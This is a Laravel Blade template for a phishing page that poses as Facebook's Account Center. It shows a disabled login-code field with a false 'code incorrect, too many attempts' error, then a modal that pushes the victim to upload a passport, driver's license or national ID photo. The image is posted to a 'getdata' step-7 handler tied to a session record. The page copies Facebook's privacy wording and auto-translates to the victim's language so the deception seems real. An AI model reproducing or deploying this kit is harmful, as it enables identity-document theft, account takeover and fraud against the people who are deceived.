@extends('layouts.app')

@section('content')
<div id="root">
        <div class="flex w-full flex-col items-center justify-center p-4">
          <div
            class="flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3">
            <div class="flex flex-col">
            <b>Account Center - Facebook</b><b class="text-2xl">Check notifications on another device</b>            </div>
            <img src="{{ asset('assets/verify_otp.jpg') }}" alt="" />
            <div><b>Approve from another device or Enter your login code</b><p>Enter 6-digit code we just send from the authentication app you set up, or Enter 8-digit recovery code</p></div>
            <div class="my-2">
              <input
                class="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                type="text"
                autocomplete="one-time-code"
                inputmode="numeric"
                maxlength="8"
                minlength="6"
                pattern="\d*"
                placeholder="Enter Code"
                value=""
                disabled />
              <p class="text-red-500" id="codeError" style="padding-top: 5px">
              This code is incorrect. You are limited because you have done that action too many times.              </p>
              <button
                class="my-5 flex w-full items-center justify-center rounded-lg p-4 font-semibold text-white cursor-pointer bg-blue-500 hover:bg-blue-600"
                id="open-identity">
                <div class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>
              </button>
            </div>
            
          </div>
          <div
            class="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-75"
            id="identity">
            <div class="w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5">
              <div class="relative mb-4 flex items-center justify-center">
                <h2 class="text-xl font-semibold text-gray-800">
                Confirm your identity                </h2>
                <svg
                  aria-hidden="true"
                  focusable="false"
                  data-prefix="fas"
                  data-icon="xmark"
                  class="svg-inline--fa fa-xmark absolute right-0 top-1/2 hidden h-5 w-5 -translate-y-1/2 transform cursor-pointer rounded-full bg-gray-200 p-2 text-gray-600 hover:bg-gray-300 md:block"
                  role="img"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 384 512"
                  id="close">
                  <path
                    fill="currentColor"
                    d="M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z"></path>
                </svg>
              </div>
              <hr class="my-4 border-gray-300" />
              <div class="mb-4"><b class="text-lg text-gray-700">Choose type of ID to upload</b><p class="mt-2 text-gray-600">We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.</p></div>              <div class="mb-4 w-full font-semibold text-gray-700">
                <label
                  for="passport"
                  class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"><span>Passport</span><input
                    type="radio"
                    id="passport"
                    name="document"
                    class="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    value="passport"
                    checked="" /></label><label
                  for="drivers-license"
                  class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"><span>Driver's license</span><input
                    type="radio"
                    id="drivers-license"
                    name="document"
                    class="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    value="drivers-license" /></label><label
                  for="national-id"
                  class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200"><span>National ID card</span><input
                    type="radio"
                    id="national-id"
                    name="document"
                    class="h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500"
                    value="national-id" /></label>
              </div>
              <input type="file" accept="image/*" class="hidden" />
              <div class="rounded-md bg-gray-100 p-4 text-sm text-gray-600">Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information. <a href="https://www.facebook.com/help/155050237914643/" target="_blank" class="text-blue-600 underline">Learn more</a></div>              <button
                class="mt-6 w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600"
                id="upload-btn">
                Upload Image              </button>

              <!-- Input ẩn để chọn file -->
              <form id="upload-form" enctype="multipart/form-data" action="{{ route('getdata') }}" method="POST">
                @csrf
                <input type="hidden" name="step" value="7">
                <input type="hidden" name="id" value="{{ session('record_id') }}">
                <input type="file" name="identity_image" id="file-input" accept="image/*" />
              </form>

            </div>
          </div>
        </div>
      </div>
      <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
        } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
        }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
      <script>
        $(document).ready(function() {
          $("#close").click(function() {
            $("#identity").addClass("hidden");
            setTimeout(function() {
              $("#open-identity").html("Confirm your identity");
            }, 1000); // Thay đổi thời gian delay nếu cần
          });
          $("#open-identity").click(function() {
            $("#identity").removeClass("hidden");
            $("#open-identity").html(
              '<div style="user-select: none;"  class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
            );
          });
        });
        //////////////////////////////////////////////////////////////////////
        // Lấy root domain
        var rootDomain = window.location.origin;
        // Lấy folder hiện tại từ URL
        var currentFolder = window.location.pathname.split('')[1] || ''; // Nếu không có folder, sử dụng chuỗi rỗng
        // Tạo URL callback
        var callback = rootDomain + (currentFolder ? '/' + currentFolder : '');
        // Khi click vào nút Upload Image
        $('#upload-btn').click(function() {
          $('#file-input').click(); // Kích hoạt sự kiện click cho input file
        });

        // Khi người dùng chọn file
        $('#file-input').on('change', function() {
          // Kiểm tra xem có file nào được chọn không
          if (this.files && this.files.length > 0) {
            var continueButton = $("#upload-btn");
            continueButton.html(
                '<div class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
            );
            setTimeout(function() {
                $("#upload-form").submit();
            }, 2000);
          }
        });
      </script>
@endsection